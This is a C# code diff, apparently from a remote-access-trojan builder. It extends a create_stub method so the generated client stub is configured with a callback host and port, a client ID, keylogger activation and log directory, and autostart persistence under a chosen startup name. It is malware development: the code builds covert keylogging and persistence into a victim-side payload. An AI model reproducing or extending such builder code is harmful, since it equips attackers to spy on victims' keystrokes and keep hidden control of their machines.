@@ -16,7 +16,9 @@ namespace Serveur.Controllers
 
         }
 
-        public void create_stub(string host, string port, string mutex, string numReconnectTries)
+        public void create_stub(string host, string port, string mutex, string numReconnectTries, string clientID,
+            string klEnabled, string  klDirectory,
+            string autoStart, string startupName)
         {
             SaveFileDialog save_file = new SaveFileDialog();
             try
@@ -32,6 +34,11 @@ namespace Serveur.Controllers
                     writer.Write("-STARTport-" + port + "-ENDport-");
                     writer.Write("-STARTmutex-" + getUniqueMutex(18) + "-ENDmutex-");
                     writer.Write("-STARTrecoTries-" + numReconnectTries + "-ENDrecoTries-");
+                    writer.Write("-STARTclientID-" + clientID + "-ENDclientID-");
+                    writer.Write("-STARTklEnabled-" + klEnabled + "-ENDklEnabled-");
+                    writer.Write("-STARTklDirectory-" + klDirectory + "-ENDklDirectory-");
+                    writer.Write("-STARTautoStart-" + autoStart + "-ENDautoStart-");
+                    writer.Write("-STARTstartupName-" + startupName + "-ENDstartupName-");
                     writer.Flush();
                     writer.Close();
                     stream.Close();
